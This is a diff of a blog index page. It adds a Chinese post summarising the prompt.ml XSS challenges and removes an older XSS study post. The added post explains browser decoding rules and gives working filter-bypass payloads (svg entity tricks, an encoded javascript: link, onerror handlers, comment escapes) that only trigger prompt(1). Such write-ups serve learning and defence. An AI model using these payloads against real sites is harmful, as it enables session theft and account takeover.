@@ -62,6 +62,175 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss练习小结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/09/21/xss练习小结/" class="article-date">
+  <time datetime="2019-09-21T00:42:42.000Z" itemprop="datePublished">2019-09-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/21/xss练习小结/">xss练习小结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一次萌生去练习xss还是因为打了rwctf，感觉这块自己还是不太熟悉，所以挑出来练一下。下面的题目解析并不是按照顺序，而是按照涉及的不同问题来分类的。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;练习网站是<b>prompt.ml</b>，整体做下来虽然感觉做出的题目很少，但确实学到了不少东西。</p>
+<h3 id="关于几种编码"><a href="#关于几种编码" class="headerlink" title="关于几种编码"></a>关于几种编码</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xss的payload中使用的编码无非几种</p>
+<ul>
+<li>urlencode</li>
+<li>html实体编码</li>
+<li>unicode</li>
+<li>base64</li>
+<li>ascii(string.fromCharCode)</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里有一篇文章很好地梳理了各种浏览器对xss的各种编码的解析 <a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要的内容有这么几点：</p>
+<ul>
+<li>html元素共有五种:<ol>
+<li>空元素（如br,area等等）这些元素不能容纳任何内容</li>
+<li>纯文本元素(典型的是script和style)，这些元素只能容纳纯文本，也就是说，这些元素中间容纳的内容并不会被html解码。所以在script标签中使用html编码绕过waf是不会被解析的。</li>
+<li>RCDTA元素，能容纳html实体引用和文本，也就是说，RCDTA元素中的html编码的字段会被解码。例如textarea元素和title元素。但是textarea和title内的元素标签并不会被解析。</li>
+<li>外部元素，例如svg和MathML命名空间，内部能解析html实体，注释，文本，其他元素还有<i>CDATA</i>段。</li>
+<li>其余的所有元素，解析内容和外部元素一样除了不能解析CDATA段。</li>
+</ol>
+</li>
+</ul>
+<br>
+
+<p>这里有一道题就用到了外部实体(prompt(2))</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里过滤了=和(这造成了prompt函数无法完成，思路应该是用某种编码绕过waf。上面讲到的svg标签中不仅可以容纳子标签还可以解析html实体，所以最后的payload应该是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert&amp;#40;1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<ul>
+<li><p>url编码</p>
+<ol>
+<li><p>url解码往往发生在需要引入url上下文的时候（通常是引入外部url的时候），通常这里会先进行一轮html decode，然后才进行url decode，通常这里可以用html实体编码隐藏一些被waf过滤的东西。例如这段经典的payload </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>url不能对协议和:进行解码，url合法的协议都应该是有ascii字母组成。</p>
+</li>
+</ol>
+</li>
+</ul>
+<br>
+
+<ul>
+<li>javascript编码<ol>
+<li>javascript中可以用unicode或者hex代替函数或者变量的名称，但是例如(),&gt;,=,’,”等等有特殊含义的符号不能如此处理。</li>
+<li>通常javascript解析出现在script标签和可以调用javascipt的html标签属性处。</li>
+<li>javascript一些不可打印字符可以拿来过waf比如\u2028</li>
+</ol>
+</li>
+</ul>
+<br>
+
+<h3 id="html中一些小trick"><a href="#html中一些小trick" class="headerlink" title="html中一些小trick"></a>html中一些小trick</h3><ol>
+<li><p>非闭合标签，这和浏览器的容错有关，例如prompt的第二关</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span> /</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>还是浏览器能兼容一些换行符比如\u2028,\r\n等等</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">     <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">     <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">     input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'"  type="text"&gt;'</span>;</span><br><span class="line"> &#125;  </span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">这里的payload，刚好可以绕过正则的过滤，而type=image 则可以将input视为图片标签从而转化到img事件处理达到xss的形式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span> html</span><br><span class="line"><span class="string">" src type= "</span>image<span class="string">" onerror=</span></span><br><span class="line"><span class="string">"</span>prompt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>input标签的type，在某些情况下可以将input标签转化为img标签用</p>
+</li>
+</ol>
+<h3 id="使用注释的一些小trick"><a href="#使用注释的一些小trick" class="headerlink" title="使用注释的一些小trick"></a>使用注释的一些小trick</h3><ol>
+<li><p>html5中的闭合标签，例如prompt第三关</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span></span><br><span class="line">html5</span><br><span class="line"><span class="comment">&lt;!-- --!&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>html中–&gt; 会被解析为//，例如prompt第八关<br>这道题是典型的注释逃逸。</p>
+<p>过滤了换行和&lt;，/注释符，还有</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) &#125;</span></span><br><span class="line"><span class="function"> // <span class="title">prevent</span> <span class="title">input</span> <span class="title">from</span> <span class="title">getting</span> <span class="title">out</span> <span class="title">of</span> <span class="title">comment</span></span></span><br><span class="line"><span class="function"> // <span class="title">strip</span> <span class="title">off</span> <span class="title">line</span>-<span class="title">breaks</span> <span class="title">and</span> <span class="title">stuff</span></span></span><br><span class="line"><span class="function"> <span class="title">input</span> = <span class="title">input</span>.<span class="title">replace</span>(<span class="params"><span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span></span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">return</span> '                                \<span class="title">n</span>\</span></span><br><span class="line"><span class="function"> &lt;<span class="title">script</span>&gt;                                    \<span class="title">n</span>\</span></span><br><span class="line"><span class="function"> // <span class="title">console</span>.<span class="title">log</span>(<span class="params"><span class="string">"' + input + '"</span></span>);        \<span class="title">n</span>\</span></span><br><span class="line"><span class="function"> &lt;/<span class="title">script</span>&gt; ';</span></span><br><span class="line"><span class="function"> &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有两个点，一个是通过unicode的换行符\u2028做到换行的功能，另外一个是通过–&gt;会在html中被当做//来过滤剩下的未逃逸的部分</p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    prompt(1) --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的payload有个处理的办法，就是将内容转化为\u2028prompt(1)\u2028放到console中得到编码后的串然后再提交。</p>
+</li>
+<li><p>多行标签内注入点，可以采用javascript块注释，html注释，还有根据浏览器的特殊标签来插入xss。</p>
+<br>
+例如prompt第七关和第十五关
+<br>
+
+</li>
+</ol>
+<p>第七关</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第十五关</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分别是用javascript的块注释和html的注释进行绕过的</p>
+<p>需要注意的一点是，使用html的注释时，注释中不能存在&gt;，这和注释的解析算法有关。弥补方法是添加svg标签。</p>
+<p>payload 7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;/*#*/prompt(1/*#*/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload 15</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;典型的逻辑问题就是二次过滤，因为这个过程给了通过waf来构造waf的机会。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;典型的例子就是prompt的第10关</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>问题很明显，传入类似pr’ompt(1)的表达式能过第一个waf，并且可以利用第二个置空来出掉多余的’。</p>
+<h3 id="javascript的小tricks"><a href="#javascript的小tricks" class="headerlink" title="javascript的小tricks"></a>javascript的小tricks</h3><ol>
+<li><p>javascript变量覆盖问题</p>
+<p>prompt的第六关</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// let's do a post redirection</span></span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">     <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">     <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">     <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">     <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">     form.action = formURL;</span><br><span class="line">     form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">         <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">         input.name = i;</span><br><span class="line">         input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">     &lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">     // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">     if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">     document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">     else                                                  \n\</span></span><br><span class="line"><span class="string">          document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">     &lt;/script&gt;                                                    \n\</span></span><br><span class="line"><span class="string">     '</span>;</span><br><span class="line">     &#125;  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>javascript中出现同名属性和子tag时，使用.访问子tag更优先。这里通过构造子input标签的方法来绕过waf。<br>而这里document.form[0].action可能会访问form表单的第一个名为action的input标签从而绕过过滤。</p>
+<p>payload 6</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action","xxx"&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>javascript的一些危险函数</p>
+</li>
+</ol>
+<ul>
+<li><p>replace()函数，主要是使用特殊字符串作为第二个参数的时候。</p>
+<p>  reference: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p>
+<p><img src="https://i.loli.net/2019/09/21/HtfpXK2sWg7b3Ej.png" alt="image.png"></p>
+</li>
+<li><p>toUpperCase()函数,这个函数可能会将一些unicode 转为大写或者小写的ascii字母。<br><br>305 Original : ı [\u131] LowerCase :  UpperCase : I<br><br>383 Original : ſ [\u17f] LowerCase :  UpperCase : S<br><br>8490 Original : K [\u212a] LowerCase : k UpperCase : <br><br>64261 Original : ﬅ [\ufb05] LowerCase :  UpperCase : ST<br><br>64262 Original : ﬆ [\ufb06] LowerCase :  UpperCase : ST<br></p>
+</li>
+</ul>
+<ol start="3">
+<li>javascript的原型继承问题<br>javascipt通过成员访问函数访问属性时，如果查找不到，就会沿着继承链向上查找，其中所有的javascript对象都会继承一个叫<strong>proto</strong>的对象。可以通过修改<strong>proto</strong>对象的属性来达到某些目的。例如13关的waf当检查到不安全属性时，就会删除该属性。但如果通过原型链污染的方法来，将这个属性添加在原型中，使对象再次被访问时，获取原型的同名属性值来绕过waf。</li>
+<li>javascript的代码报错执行函数。<br><br>((prompt(1)))instanceof”” <br><br>((prompt(1)))in”” 会先执行左边的表达式然后再执行in或者instanceof表达式从而执行函数。<h3 id="其他的小tricks"><a href="#其他的小tricks" class="headerlink" title="其他的小tricks"></a>其他的小tricks</h3></li>
+<li>解析url时碰到@的时候会将后面的资源一并加载进来。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉xss还是挺灵活的，各种payload用到了不少知识，挺值得进一步研究的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wanghuidi.github.io/2019/09/21/xss练习小结/" data-id="ck0t7ik6b000l76648pp4ve5y" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Minuv2靶机渗透实战" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/09/11/Minuv2靶机渗透实战/" class="article-date">
@@ -150,7 +319,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/09/11/Minuv2靶机渗透实战/" data-id="ck0fz07bo0000er64hql4meg4" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/09/11/Minuv2靶机渗透实战/" data-id="ck0t7ik5j000076641g4uydza" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
@@ -241,7 +410,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/09/02/shell编程基础/" data-id="ck0fz07bu0001er648bkb7e8i" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/09/02/shell编程基础/" data-id="ck0t7ik6100057664zua2qv67" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/">shell</a></li></ul>
@@ -300,7 +469,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/08/20/简易python模板引擎其一/" data-id="ck0fz07bx0003er645dbebtuv" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/08/20/简易python模板引擎其一/" data-id="ck0t7ik6300087664rsagkn3q" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/500lines/">500lines</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
@@ -382,7 +551,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/08/11/xxe注入入门/" data-id="ck0fz07bz0005er647jsodpux" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/08/11/xxe注入入门/" data-id="ck0t7ik6400097664l0geexa5" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe注入/">xxe注入</a></li></ul>
@@ -518,77 +687,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/06/24/文件上传漏洞/" data-id="ck0fz07co000oer64ue0wndgu" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/06/24/文件上传漏洞/" data-id="ck0t7ik6d000o76645imzs5z2" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-xss学习小结" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/06/12/xss学习小结/" class="article-date">
-  <time datetime="2019-06-12T12:46:05.000Z" itemprop="datePublished">2019-06-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/12/xss学习小结/">xss学习小结</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;近期做了下有关xss的一些练习，入手了xss的学习，下面结合题目做一下小结</p>
-<h2 id="xss的介绍"><a href="#xss的介绍" class="headerlink" title="xss的介绍"></a>xss的介绍</h2><p>&emsp;&emsp;xss即跨站脚本的简称，是一种通过注入html代码，并等待受害者加载页面从而实现恶意目的的一种攻击方式。主要有三种形式，反射型xss,存储型xss以及dom型xss。</p>
-<p>&emsp;&emsp;反射型xss和存储型xss最大的区别在于存储型xss的恶意代码将存入数据库，当每一个用户访问被处理后的页面后都会加载恶意代码。而反射型xss则需要用一些手段诱导用户点击带有恶意代码的链接从而达成目的。</p>
-<p>&emsp;&emsp;dom型xss是通过修改dom节点而形成的xss，举一个推特的dom型xss为例。</p>
-<code>
-(function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a.replace(/:/gi,"");}})(window);
-</code>
-
-<p>代码加载后，window.location会被修改为#!后的值，经过处理后可以引发xss。</p>
-<h2 id="xss的一些姿势"><a href="#xss的一些姿势" class="headerlink" title="xss的一些姿势"></a>xss的一些姿势</h2><h3 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h3><ul>
-<li>script 标签闭合</li>
-<li>通过标签的属性引发 例如img标签的onerror,onfouse,onmousemove等等</li>
-<li>javascript 伪协议（其中img的src属性伪协议只能在ie中触发xss）</li>
-<li>data协议，base64,url编码等等</li>
-<li>iframe标签, body标签等等<h3 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h3></li>
-<li>random case 随机大小写</li>
-<li>过滤空格，考虑/**/,/等等</li>
-<li>html实体编码，包括16进制和10进制的编码&#xx;的形式</li>
-<li>js编码包括16进制，8进制，以及unicode 编码</li>
-<li>利用string.fromCharCode,/xxx/等可以突破双引号的限制</li>
-<li>利用eval和atob函数调用base64编码的代码<h3 id="css注入"><a href="#css注入" class="headerlink" title="css注入"></a>css注入</h3></li>
-<li>利用background的url属性</li>
-<li>利用expression()调用js代码，这个仅在ie中生效</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;由于七牛云还没有过实名，就先不加案例了，以后一起补。xss在不同的浏览器上姿势是可能不同的，这可能是需要补充的部分。</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h2><ul>
-<li><p>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities</p>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/06/12/xss学习小结/" data-id="ck0fz07by0004er6416f2tfhm" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
 
     </footer>
   </div>
@@ -635,7 +737,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/06/05/sql注入初步/" data-id="ck0fz07ce000ler6463rawkc7" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/06/05/sql注入初步/" data-id="ck0t7ik62000676643gzy2oui" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -692,6 +794,10 @@
       <ul>
         
           <li>
